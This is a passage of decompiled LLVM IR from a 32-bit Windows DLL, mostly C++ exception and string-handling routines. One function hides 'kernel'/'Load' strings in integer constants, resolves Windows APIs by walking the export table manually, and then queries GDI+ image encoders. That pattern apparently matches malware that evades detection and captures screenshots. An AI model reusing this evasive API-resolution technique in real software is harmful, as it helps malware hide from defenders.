  store i32 %15, i32* %esp.1.reg2mem
  br label %dec_label_pc_10001ebd

dec_label_pc_10001e62:                            ; preds = %dec_label_pc_10001e30
  ret void, !insn.addr !523

dec_label_pc_10001e68:                            ; preds = %dec_label_pc_10001e49
  store i8* null, i8** %stack_var_-48, align 4, !insn.addr !524
  %19 = call i32 @"__CxxThrowException@8"(), !insn.addr !525
  br label %dec_label_pc_10001e71, !insn.addr !525

dec_label_pc_10001e71:                            ; preds = %dec_label_pc_10001e68, %dec_label_pc_10001e4f
  %20 = call i32 @function_10001a00(i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32)), !insn.addr !526
  store i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_10039ca0, i32 0, i32 0), i8** %stack_var_-48, align 4, !insn.addr !527
  %21 = call i32 @function_10001e00(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_10039ca0, i32 0, i32 0), i32 %20), !insn.addr !528
  %22 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !529
  store i32 %22, i32* %stack_var_-56, align 4, !insn.addr !529
  %23 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !529
  %24 = call i32 @"__CxxThrowException@8"(), !insn.addr !530
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !530
  br label %dec_label_pc_10001e97, !insn.addr !530

dec_label_pc_10001e97:                            ; preds = %dec_label_pc_10001e71, %dec_label_pc_10001e5b
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %25 = call i32 @function_10001a00(i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32)), !insn.addr !531
  %26 = add i32 %esp.0.reload, 4, !insn.addr !532
  %27 = inttoptr i32 %26 to i32*, !insn.addr !532
  store i32 %25, i32* %27, align 4, !insn.addr !532
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !533
  store i32 ptrtoint ([22 x i8]* @global_var_10039cb8 to i32), i32* %28, align 4, !insn.addr !533
  %29 = call i32 @function_10001e00(i8* bitcast (i32* @4 to i8*), i32 ptrtoint (i32* @4 to i32)), !insn.addr !534
  %30 = add i32 %esp.0.reload, -4, !insn.addr !535
  %31 = inttoptr i32 %30 to i32*, !insn.addr !535
  store i32 ptrtoint (i32* @global_var_1003c2cc to i32), i32* %31, align 4, !insn.addr !535
  %32 = add i32 %esp.0.reload, 12, !insn.addr !536
  %33 = add i32 %esp.0.reload, -8, !insn.addr !537
  %34 = inttoptr i32 %33 to i32*
  store i32 %32, i32* %34, align 4, !insn.addr !537
  %35 = call i32 @"__CxxThrowException@8"(), !insn.addr !538
  store i32* %34, i32** %.pre-phi.reg2mem, !insn.addr !538
  store i32 %33, i32* %esp.1.reg2mem, !insn.addr !538
  br label %dec_label_pc_10001ebd, !insn.addr !538

dec_label_pc_10001ebd:                            ; preds = %dec_label_pc_10001e5b.dec_label_pc_10001ebd_crit_edge, %dec_label_pc_10001e97
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %36 = call i32 @function_10001a00(i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32)), !insn.addr !539
  %37 = add i32 %esp.1.reload, 4, !insn.addr !540
  %38 = inttoptr i32 %37 to i32*, !insn.addr !540
  store i32 %36, i32* %38, align 4, !insn.addr !540
  store i32 ptrtoint ([21 x i8]* @global_var_10039cd0 to i32), i32* %.pre-phi.reload, align 4, !insn.addr !522
  %39 = call i32 @function_10001e00(i8* bitcast (i32* @4 to i8*), i32 ptrtoint (i32* @4 to i32)), !insn.addr !541
  %40 = add i32 %esp.1.reload, -4, !insn.addr !542
  %41 = inttoptr i32 %40 to i32*, !insn.addr !542
  store i32 ptrtoint (i32* @global_var_1003c2cc to i32), i32* %41, align 4, !insn.addr !542
  %42 = add i32 %esp.1.reload, 12, !insn.addr !543
  %43 = add i32 %esp.1.reload, -8, !insn.addr !544
  %44 = inttoptr i32 %43 to i32*, !insn.addr !544
  store i32 %42, i32* %44, align 4, !insn.addr !544
  %45 = call i32 @"__CxxThrowException@8"(), !insn.addr !545
  %46 = call i32 @__asm_int3(), !insn.addr !546
  %47 = call i32 @__asm_int3(), !insn.addr !547
  %48 = call i32 @__asm_int3(), !insn.addr !548
  %49 = call i32 @__asm_int3(), !insn.addr !549
  %50 = call i32 @__asm_int3(), !insn.addr !550
  %51 = call i32 @__asm_int3(), !insn.addr !551
  %52 = call i32 @__asm_int3(), !insn.addr !552
  %53 = call i32 @__asm_int3(), !insn.addr !553
  %54 = call i32 @__asm_int3(), !insn.addr !554
  %55 = call i32 @__asm_int3(), !insn.addr !555
  %56 = call i32 @__asm_int3(), !insn.addr !556
  %57 = call i32 @__asm_int3(), !insn.addr !557
  %58 = call i32 @__asm_int3(), !insn.addr !558
  %59 = add i32 %esp.1.reload, -12, !insn.addr !559
  %60 = inttoptr i32 %59 to i32*, !insn.addr !559
  %61 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !559
  store i32 %61, i32* %60, align 4, !insn.addr !559
  %62 = add i32 %esp.1.reload, -16, !insn.addr !560
  %63 = inttoptr i32 %62 to i32*, !insn.addr !560
  store i32 -1, i32* %63, align 4, !insn.addr !560
  %64 = add i32 %esp.1.reload, -20, !insn.addr !561
  %65 = inttoptr i32 %64 to i32*, !insn.addr !561
  store i32 268614336, i32* %65, align 4, !insn.addr !561
  %66 = call i32 @__readfsdword(i32 0), !insn.addr !562
  %67 = add i32 %esp.1.reload, -24, !insn.addr !563
  %68 = inttoptr i32 %67 to i32*, !insn.addr !563
  store i32 %66, i32* %68, align 4, !insn.addr !563
  %69 = add i32 %esp.1.reload, -28, !insn.addr !564
  %70 = inttoptr i32 %69 to i32*, !insn.addr !564
  %71 = load i32, i32* @global_var_1003e084, align 4, !insn.addr !565
  %72 = xor i32 %71, %59, !insn.addr !566
  %73 = add i32 %esp.1.reload, -32, !insn.addr !567
  %74 = inttoptr i32 %73 to i32*, !insn.addr !567
  store i32 %72, i32* %74, align 4, !insn.addr !567
  call void @__writefsdword(i32 0, i32 %67), !insn.addr !568
  %75 = add i32 %esp.1.reload, 68, !insn.addr !569
  %76 = inttoptr i32 %75 to i32*, !insn.addr !569
  %77 = load i32, i32* %76, align 4, !insn.addr !569
  %78 = load i32, i32* %41, align 4, !insn.addr !570
  store i32 0, i32* %63, align 4, !insn.addr !571
  %79 = add i32 %77, 4, !insn.addr !572
  %80 = inttoptr i32 %79 to i32*, !insn.addr !572
  %81 = load i32, i32* %80, align 4, !insn.addr !572
  %82 = add i32 %78, 4, !insn.addr !573
  %83 = inttoptr i32 %82 to i32*, !insn.addr !573
  store i32 %81, i32* %83, align 4, !insn.addr !573
  %84 = load i32, i32* %68, align 4, !insn.addr !574
  call void @__writefsdword(i32 0, i32 %84), !insn.addr !575
  ret void, !insn.addr !576
}

define i32 @function_10001f40(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001f40:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_4()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !577
  %3 = add i32 %0, 4, !insn.addr !578
  %4 = inttoptr i32 %0 to i32*, !insn.addr !579
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %4, align 4, !insn.addr !579
  %5 = inttoptr i32 %3 to i64*, !insn.addr !580
  %6 = load i64, i64* %5, align 4, !insn.addr !580
  call void @__asm_movq.40(i64 %6, i128 %2), !insn.addr !580
  %7 = call i32 @___std_exception_copy(), !insn.addr !581
  store i32 ptrtoint (%vtable_1002d434_type* @global_var_1002d434 to i32), i32* %4, align 4, !insn.addr !582
  %8 = add i32 %arg1, 12, !insn.addr !583
  %9 = inttoptr i32 %8 to i32*, !insn.addr !583
  %10 = load i32, i32* %9, align 4, !insn.addr !583
  %11 = add i32 %0, 12, !insn.addr !584
  %12 = inttoptr i32 %11 to i32*, !insn.addr !584
  store i32 %10, i32* %12, align 4, !insn.addr !584
  %13 = add i32 %arg1, 16, !insn.addr !585
  %14 = inttoptr i32 %13 to i32*, !insn.addr !585
  %15 = load i32, i32* %14, align 4, !insn.addr !585
  %16 = add i32 %0, 16, !insn.addr !586
  %17 = inttoptr i32 %16 to i32*, !insn.addr !586
  store i32 %15, i32* %17, align 4, !insn.addr !586
  store i32 ptrtoint (i32* @global_var_1002d468 to i32), i32* %4, align 4, !insn.addr !587
  ret i32 %0, !insn.addr !588
}

define i32 @function_10001f90(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001f90:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_4()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !589
  %3 = add i32 %0, 4, !insn.addr !590
  %4 = inttoptr i32 %0 to i32*, !insn.addr !591
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %4, align 4, !insn.addr !591
  %5 = inttoptr i32 %3 to i64*, !insn.addr !592
  %6 = load i64, i64* %5, align 4, !insn.addr !592
  call void @__asm_movq.40(i64 %6, i128 %2), !insn.addr !592
  %7 = call i32 @___std_exception_copy(), !insn.addr !593
  store i32 ptrtoint (%vtable_1002d434_type* @global_var_1002d434 to i32), i32* %4, align 4, !insn.addr !594
  %8 = add i32 %arg1, 12, !insn.addr !595
  %9 = inttoptr i32 %8 to i32*, !insn.addr !595
  %10 = load i32, i32* %9, align 4, !insn.addr !595
  %11 = add i32 %0, 12, !insn.addr !596
  %12 = inttoptr i32 %11 to i32*, !insn.addr !596
  store i32 %10, i32* %12, align 4, !insn.addr !596
  %13 = add i32 %arg1, 16, !insn.addr !597
  %14 = inttoptr i32 %13 to i32*, !insn.addr !597
  %15 = load i32, i32* %14, align 4, !insn.addr !597
  %16 = add i32 %0, 16, !insn.addr !598
  %17 = inttoptr i32 %16 to i32*, !insn.addr !598
  store i32 %15, i32* %17, align 4, !insn.addr !598
  store i32 ptrtoint (i32* @global_var_1002d440 to i32), i32* %4, align 4, !insn.addr !599
  ret i32 %0, !insn.addr !600
}

define i32 @function_10001fe0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001fe0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_4()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !601
  %3 = add i32 %0, 4, !insn.addr !602
  %4 = inttoptr i32 %0 to i32*, !insn.addr !603
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %4, align 4, !insn.addr !603
  %5 = inttoptr i32 %3 to i64*, !insn.addr !604
  %6 = load i64, i64* %5, align 4, !insn.addr !604
  call void @__asm_movq.40(i64 %6, i128 %2), !insn.addr !604
  %7 = call i32 @___std_exception_copy(), !insn.addr !605
  store i32 ptrtoint (%vtable_1002d434_type* @global_var_1002d434 to i32), i32* %4, align 4, !insn.addr !606
  %8 = add i32 %arg1, 12, !insn.addr !607
  %9 = inttoptr i32 %8 to i32*, !insn.addr !607
  %10 = load i32, i32* %9, align 4, !insn.addr !607
  %11 = add i32 %0, 12, !insn.addr !608
  %12 = inttoptr i32 %11 to i32*, !insn.addr !608
  store i32 %10, i32* %12, align 4, !insn.addr !608
  %13 = add i32 %arg1, 16, !insn.addr !609
  %14 = inttoptr i32 %13 to i32*, !insn.addr !609
  %15 = load i32, i32* %14, align 4, !insn.addr !609
  %16 = add i32 %0, 16, !insn.addr !610
  %17 = inttoptr i32 %16 to i32*, !insn.addr !610
  store i32 %15, i32* %17, align 4, !insn.addr !610
  ret i32 %0, !insn.addr !611
}

define i32 @function_10002030(i8* %arg1) local_unnamed_addr {
dec_label_pc_10002030:
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-36 = alloca i8*, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !612
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !613
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !614
  %3 = load i32, i32* @global_var_1003e084, align 4, !insn.addr !615
  %4 = xor i32 %3, %1, !insn.addr !616
  store i32 %4, i32* %stack_var_-32, align 4, !insn.addr !617
  %5 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !618
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !619
  store i8* inttoptr (i32 12 to i8*), i8** %stack_var_-36, align 4, !insn.addr !620
  %6 = call i32 @"??2@YAPAXI@Z"(i32 12), !insn.addr !621
  %7 = icmp eq i32 %6, 0, !insn.addr !622
  br i1 %7, label %dec_label_pc_1000209a, label %dec_label_pc_1000208d.thread, !insn.addr !623

dec_label_pc_1000208d.thread:                     ; preds = %dec_label_pc_10002030
  %8 = ptrtoint i8* %arg1 to i32
  %9 = bitcast i8** %stack_var_-36 to i32*
  store i32 %8, i32* %9, align 4
  %10 = add i32 %6, 4, !insn.addr !624
  %11 = inttoptr i32 %10 to i32*, !insn.addr !624
  store i32 0, i32* %11, align 4, !insn.addr !624
  %12 = add i32 %6, 8, !insn.addr !625
  %13 = inttoptr i32 %12 to i32*, !insn.addr !625
  store i32 1, i32* %13, align 4, !insn.addr !625
  %14 = load i8*, i8** %stack_var_-36, align 4, !insn.addr !626
  %15 = ptrtoint i8* %14 to i32, !insn.addr !626
  %16 = call i32 @function_10011020(i32 %15), !insn.addr !626
  %17 = inttoptr i32 %6 to i32*, !insn.addr !627
  store i32 %16, i32* %17, align 4, !insn.addr !627
  %18 = inttoptr i32 %0 to i32*, !insn.addr !628
  store i32 %6, i32* %18, align 4, !insn.addr !628
  br label %dec_label_pc_100020a4

dec_label_pc_1000209a:                            ; preds = %dec_label_pc_10002030
  %19 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !629
  %20 = inttoptr i32 %0 to i32*, !insn.addr !628
  store i32 0, i32* %20, align 4, !insn.addr !628
  %21 = add i32 %19, -4, !insn.addr !630
  %22 = inttoptr i32 %21 to i32*, !insn.addr !630
  store i32 -2147024882, i32* %22, align 4, !insn.addr !630
  %23 = call i32 @function_10010ee0(i32 -1), !insn.addr !631
  br label %dec_label_pc_100020a4, !insn.addr !631

dec_label_pc_100020a4:                            ; preds = %dec_label_pc_1000208d.thread, %dec_label_pc_1000209a
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !632
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !633
  ret i32 %0, !insn.addr !634
}

define i32 @function_100020c0(i16* %arg1) local_unnamed_addr {
dec_label_pc_100020c0:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !635
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-36 = alloca i16*, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !636
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !637
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !638
  %3 = load i32, i32* @global_var_1003e084, align 4, !insn.addr !639
  %4 = xor i32 %3, %1, !insn.addr !640
  store i32 %4, i32* %stack_var_-32, align 4, !insn.addr !641
  %5 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !642
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !643
  store i16* inttoptr (i32 12 to i16*), i16** %stack_var_-36, align 4, !insn.addr !644
  %6 = call i32 @"??2@YAPAXI@Z"(i32 12), !insn.addr !645
  %7 = icmp eq i32 %6, 0, !insn.addr !646
  store i32* %stack_var_-32, i32** %esp.0.in.reg2mem, !insn.addr !647
  br i1 %7, label %dec_label_pc_1000213c, label %dec_label_pc_10002101, !insn.addr !647

dec_label_pc_10002101:                            ; preds = %dec_label_pc_100020c0
  %8 = ptrtoint i16* %arg1 to i32
  %9 = bitcast i16** %stack_var_-36 to i32*
  store i32 %8, i32* %9, align 4
  %10 = add i32 %6, 4, !insn.addr !648
  %11 = inttoptr i32 %10 to i32*, !insn.addr !648
  store i32 0, i32* %11, align 4, !insn.addr !648
  %12 = add i32 %6, 8, !insn.addr !649
  %13 = inttoptr i32 %12 to i32*, !insn.addr !649
  store i32 1, i32* %13, align 4, !insn.addr !649
  %14 = load i16*, i16** %stack_var_-36, align 4, !insn.addr !650
  %15 = call i16* @SysAllocString(i16* %14), !insn.addr !650
  %16 = ptrtoint i16* %15 to i32, !insn.addr !650
  %17 = inttoptr i32 %6 to i32*, !insn.addr !651
  store i32 %16, i32* %17, align 4, !insn.addr !651
  %18 = icmp eq i16* %15, null, !insn.addr !652
  %19 = icmp eq i1 %18, false, !insn.addr !653
  %20 = icmp eq i16* %15, %arg1, !insn.addr !654
  %or.cond = or i1 %20, %19
  br i1 %or.cond, label %dec_label_pc_1000212f.thread, label %dec_label_pc_10002123, !insn.addr !653

dec_label_pc_1000212f.thread:                     ; preds = %dec_label_pc_10002101
  %21 = inttoptr i32 %0 to i32*, !insn.addr !655
  store i32 %6, i32* %21, align 4, !insn.addr !655
  br label %dec_label_pc_10002146

dec_label_pc_10002123:                            ; preds = %dec_label_pc_10002101
  store i32 -2147024882, i32* %stack_var_-40, align 4, !insn.addr !656
  %22 = call i32 @function_10010ee0(i32 -2147024882), !insn.addr !657
  store i32* %stack_var_-40, i32** %esp.0.in.reg2mem, !insn.addr !657
  br label %dec_label_pc_1000213c, !insn.addr !657

dec_label_pc_1000213c:                            ; preds = %dec_label_pc_10002123, %dec_label_pc_100020c0
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %23 = inttoptr i32 %0 to i32*, !insn.addr !655
  store i32 0, i32* %23, align 4, !insn.addr !655
  %24 = add i32 %esp.0, -4, !insn.addr !658
  %25 = inttoptr i32 %24 to i32*, !insn.addr !658
  store i32 -2147024882, i32* %25, align 4, !insn.addr !658
  %26 = call i32 @function_10010ee0(i32 -1), !insn.addr !659
  br label %dec_label_pc_10002146, !insn.addr !659

dec_label_pc_10002146:                            ; preds = %dec_label_pc_1000212f.thread, %dec_label_pc_1000213c
  %27 = load i32, i32* %stack_var_-16, align 4, !insn.addr !660
  call void @__writefsdword(i32 0, i32 %27), !insn.addr !661
  ret i32 %0, !insn.addr !662
}

define i32 @function_10002160() local_unnamed_addr {
dec_label_pc_10002160:
  %eax.1.reg2mem = alloca i32, !insn.addr !663
  %eax.0.reg2mem = alloca i32, !insn.addr !663
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !663
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-20 = alloca i16*, align 4
  %1 = icmp eq i32 %0, 0, !insn.addr !664
  br i1 %1, label %dec_label_pc_100021b8, label %dec_label_pc_1000216e, !insn.addr !665

dec_label_pc_1000216e:                            ; preds = %dec_label_pc_10002160
  %2 = add i32 %0, 8, !insn.addr !666
  %3 = inttoptr i32 %2 to i32*, !insn.addr !666
  %4 = load i32, i32* %3, align 4, !insn.addr !666
  %5 = add i32 %4, -1, !insn.addr !666
  store i32 %5, i32* %3, align 4, !insn.addr !666
  %6 = icmp eq i32 %5, 0, !insn.addr !667
  %7 = icmp eq i1 %6, false, !insn.addr !668
  br i1 %7, label %dec_label_pc_1000216e.dec_label_pc_100021b2_crit_edge, label %dec_label_pc_10002190, !insn.addr !668

dec_label_pc_1000216e.dec_label_pc_100021b2_crit_edge: ; preds = %dec_label_pc_1000216e
  %.pre = inttoptr i32 %0 to i32*, !insn.addr !669
  store i32* %.pre, i32** %.pre-phi.reg2mem
  store i32 %5, i32* %eax.0.reg2mem
  br label %dec_label_pc_100021b2

dec_label_pc_10002190:                            ; preds = %dec_label_pc_1000216e
  %8 = inttoptr i32 %0 to i16*, !insn.addr !670
  store i16* %8, i16** %stack_var_-20, align 4, !insn.addr !670
  %9 = ptrtoint i16** %stack_var_-20 to i32, !insn.addr !670
  call void @SysFreeString(i16* %8), !insn.addr !671
  %10 = inttoptr i32 %0 to i32*
  store i32 0, i32* %10, align 4, !insn.addr !672
  %11 = add i32 %0, 4, !insn.addr !673
  %12 = inttoptr i32 %11 to i32*, !insn.addr !673
  %13 = load i32, i32* %12, align 4, !insn.addr !673
  %14 = icmp eq i32 %13, 0, !insn.addr !674
  %.pre3 = add i32 %9, -4
  %.pre5 = inttoptr i32 %.pre3 to i32*
  br i1 %14, label %dec_label_pc_100021a7, label %dec_label_pc_10002197, !insn.addr !675

dec_label_pc_10002197:                            ; preds = %dec_label_pc_10002190
  store i32 %13, i32* %.pre5, align 4, !insn.addr !676
  %15 = call i32 @function_10011316(), !insn.addr !677
  store i32 0, i32* %12, align 4, !insn.addr !678
  br label %dec_label_pc_100021a7, !insn.addr !678

dec_label_pc_100021a7:                            ; preds = %dec_label_pc_10002190, %dec_label_pc_10002197
  store i32 12, i32* %.pre5, align 4, !insn.addr !679
  %16 = add i32 %9, -8, !insn.addr !680
  %17 = inttoptr i32 %16 to i32*, !insn.addr !680
  call void @"??3@YAXPAXI@Z"(i32* nonnull @4, i32 ptrtoint (i32* @4 to i32)), !insn.addr !681
  store i32* %10, i32** %.pre-phi.reg2mem, !insn.addr !682
  store i32 ptrtoint (i32* @4 to i32), i32* %eax.0.reg2mem, !insn.addr !682
  br label %dec_label_pc_100021b2, !insn.addr !682

dec_label_pc_100021b2:                            ; preds = %dec_label_pc_1000216e.dec_label_pc_100021b2_crit_edge, %dec_label_pc_100021a7
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  store i32 0, i32* %.pre-phi.reload, align 4, !insn.addr !669
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !669
  br label %dec_label_pc_100021b8, !insn.addr !669

dec_label_pc_100021b8:                            ; preds = %dec_label_pc_100021b2, %dec_label_pc_10002160
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !683
}

define i32 @function_100021c0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_100021c0:
  %.reg2mem9 = alloca i32, !insn.addr !684
  %ecx.0.reg2mem = alloca i32, !insn.addr !684
  %eax.0.reg2mem = alloca i32, !insn.addr !684
  %.reg2mem7 = alloca i32, !insn.addr !684
  %edi.0.reg2mem = alloca i32, !insn.addr !684
  %esi.0.reg2mem = alloca i32, !insn.addr !684
  %.reg2mem = alloca i32, !insn.addr !684
  %edx = alloca i32, align 8
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-207 = alloca i32, align 4
  %0 = call i32* @_memset(i32* nonnull %stack_var_-207, i32 0, i32 99), !insn.addr !685
  %1 = call i32* @_memset(i32* nonnull %stack_var_-108, i32 0, i32 100), !insn.addr !686
  store i32 1852990827, i32* %stack_var_-208, align 4, !insn.addr !687
  %2 = bitcast i32* %stack_var_-208 to i8*
  %3 = call i32* @GetModuleHandleA(i8* nonnull %2), !insn.addr !688
  %4 = ptrtoint i32* %3 to i32, !insn.addr !688
  store i32 1684107084, i32* %stack_var_-108, align 4, !insn.addr !689
  %5 = add i32 %4, 60, !insn.addr !690
  %6 = inttoptr i32 %5 to i32*, !insn.addr !690
  %7 = load i32, i32* %6, align 4, !insn.addr !690
  %8 = add i32 %4, 120, !insn.addr !691
  %9 = add i32 %8, %7, !insn.addr !691
  %10 = inttoptr i32 %9 to i32*, !insn.addr !691
  %11 = load i32, i32* %10, align 4, !insn.addr !691
  %12 = add i32 %11, %4, !insn.addr !692
  %13 = call i32 @function_1000b2e0(i32 %4, i32* nonnull %stack_var_-108), !insn.addr !693
  %14 = add i32 %12, 36, !insn.addr !694
  %15 = inttoptr i32 %14 to i32*, !insn.addr !694
  %16 = load i32, i32* %15, align 4, !insn.addr !694
  %17 = mul i32 %13, 2, !insn.addr !695
  %18 = add i32 %17, %4, !insn.addr !695
  %19 = add i32 %18, %16, !insn.addr !696
  %20 = inttoptr i32 %19 to i16*, !insn.addr !696
  %21 = load i16, i16* %20, align 2, !insn.addr !696
  %22 = zext i16 %21 to i32, !insn.addr !696
  %23 = add i32 %12, 28, !insn.addr !697
  %24 = inttoptr i32 %23 to i32*, !insn.addr !697
  %25 = load i32, i32* %24, align 4, !insn.addr !697
  %26 = mul i32 %22, 4, !insn.addr !698
  %27 = add i32 %25, %4, !insn.addr !698
  %28 = add i32 %27, %26, !insn.addr !699
  %29 = inttoptr i32 %28 to i32*, !insn.addr !699
  %30 = load i32, i32* %29, align 4, !insn.addr !699
  %31 = add i32 %30, %4, !insn.addr !700
  store i32 %31, i32* @global_var_1003fd8c, align 4, !insn.addr !701
  store i32 1633906508, i32* %stack_var_-108, align 4, !insn.addr !702
  %32 = add i32 %31, 60, !insn.addr !703
  %33 = inttoptr i32 %32 to i32*, !insn.addr !703
  %34 = load i32, i32* %33, align 4, !insn.addr !703
  %35 = add i32 %31, 120, !insn.addr !704
  %36 = add i32 %35, %34, !insn.addr !704
  %37 = inttoptr i32 %36 to i32*, !insn.addr !704
  %38 = load i32, i32* %37, align 4, !insn.addr !704
  %39 = add i32 %31, 24, !insn.addr !705
  %40 = add i32 %39, %38, !insn.addr !706
  %41 = inttoptr i32 %40 to i32*, !insn.addr !706
  %42 = load i32, i32* %41, align 4, !insn.addr !706
  store i32 %42, i32* %edx, align 8, !insn.addr !706
  %43 = call i32 @function_1000b2e0(i32 %31, i32* nonnull %stack_var_-108), !insn.addr !707
  store i32 0, i32* %stack_var_-212, align 4, !insn.addr !708
  store i32 0, i32* %stack_var_-216, align 4, !insn.addr !709
  %44 = call i32 @GdipGetImageEncodersSize(i32* nonnull %stack_var_-212, i32* nonnull %stack_var_-216), !insn.addr !710
  %45 = load i32, i32* %stack_var_-216, align 4, !insn.addr !711
  %46 = icmp eq i32 %45, 0, !insn.addr !712
  %47 = icmp eq i1 %46, false, !insn.addr !713
  br i1 %47, label %dec_label_pc_1000231d, label %dec_label_pc_1000230a, !insn.addr !713

dec_label_pc_1000230a:                            ; preds = %dec_label_pc_100021c0
  %48 = call i32 @"@__security_check_cookie@4"(), !insn.addr !714
  ret i32 %48, !insn.addr !715

dec_label_pc_1000231d:                            ; preds = %dec_label_pc_100021c0
  %49 = call i32* @LocalAlloc(i32 64, i32 %45), !insn.addr !716
  %50 = icmp eq i32* %49, null, !insn.addr !717
  br i1 %50, label %dec_label_pc_10002399, label %dec_label_pc_1000232d, !insn.addr !718

dec_label_pc_1000232d:                            ; preds = %dec_label_pc_1000231d
  %51 = load i32, i32* %stack_var_-216, align 4, !insn.addr !719
  %52 = load i32, i32* %stack_var_-212, align 4, !insn.addr !720
  %53 = call i32 @GdipGetImageEncoders(i32 %52, i32 %51, i32* nonnull %49), !insn.addr !721
  %54 = load i32, i32* %stack_var_-212, align 4, !insn.addr !722
  %55 = icmp eq i32 %54, 0, !insn.addr !722
  br i1 %55, label %dec_label_pc_10002399, label %dec_label_pc_1000234a, !insn.addr !723

dec_label_pc_1000234a:                            ; preds = %dec_label_pc_1000232d
  %56 = ptrtoint i32* %49 to i32, !insn.addr !716
  %57 = add i32 %56, 48, !insn.addr !724
  store i32 %42, i32* %.reg2mem, !insn.addr !725
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !725
  store i32 %57, i32* %edi.0.reg2mem, !insn.addr !725
  br label %dec_label_pc_10002350, !insn.addr !725

dec_label_pc_10002350:                            ; preds = %dec_label_pc_10002386, %dec_label_pc_1000234a
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %58 = inttoptr i32 %edi.0.reload to i32*, !insn.addr !726
  %59 = load i32, i32* %58, align 4, !insn.addr !726
  store i32 %.reload, i32* %.reg2mem7, !insn.addr !727
  store i32 ptrtoint ([11 x i16]* @global_var_1003928c to i32), i32* %eax.0.reg2mem, !insn.addr !727
  store i32 %59, i32* %ecx.0.reg2mem, !insn.addr !727
  br label %dec_label_pc_10002357, !insn.addr !727

dec_label_pc_10002357:                            ; preds = %dec_label_pc_1000236e, %dec_label_pc_10002350
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %.reload8 = load i32, i32* %.reg2mem7, !insn.addr !728
  %60 = inttoptr i32 %ecx.0.reload to i16*, !insn.addr !728
  %61 = load i16, i16* %60, align 2, !insn.addr !728
  %62 = zext i16 %61 to i32, !insn.addr !728
  %63 = and i32 %.reload8, -65536, !insn.addr !728
  %64 = or i32 %63, %62, !insn.addr !728
  store i32 %64, i32* %edx, align 8, !insn.addr !728
  %65 = inttoptr i32 %eax.0.reload to i16*, !insn.addr !729
  %66 = load i16, i16* %65, align 4, !insn.addr !729
  %67 = icmp eq i16 %61, %66, !insn.addr !729
  %68 = icmp eq i1 %67, false, !insn.addr !730
  store i32 %64, i32* %.reg2mem9, !insn.addr !730
  br i1 %68, label %dec_label_pc_10002386, label %dec_label_pc_1000235f, !insn.addr !730

dec_label_pc_1000235f:                            ; preds = %dec_label_pc_10002357
  %69 = icmp eq i16 %61, 0, !insn.addr !731
  br i1 %69, label %dec_label_pc_100023ad, label %dec_label_pc_10002364, !insn.addr !732

dec_label_pc_10002364:                            ; preds = %dec_label_pc_1000235f
  %70 = add i32 %ecx.0.reload, 2, !insn.addr !733
  %71 = inttoptr i32 %70 to i16*, !insn.addr !733
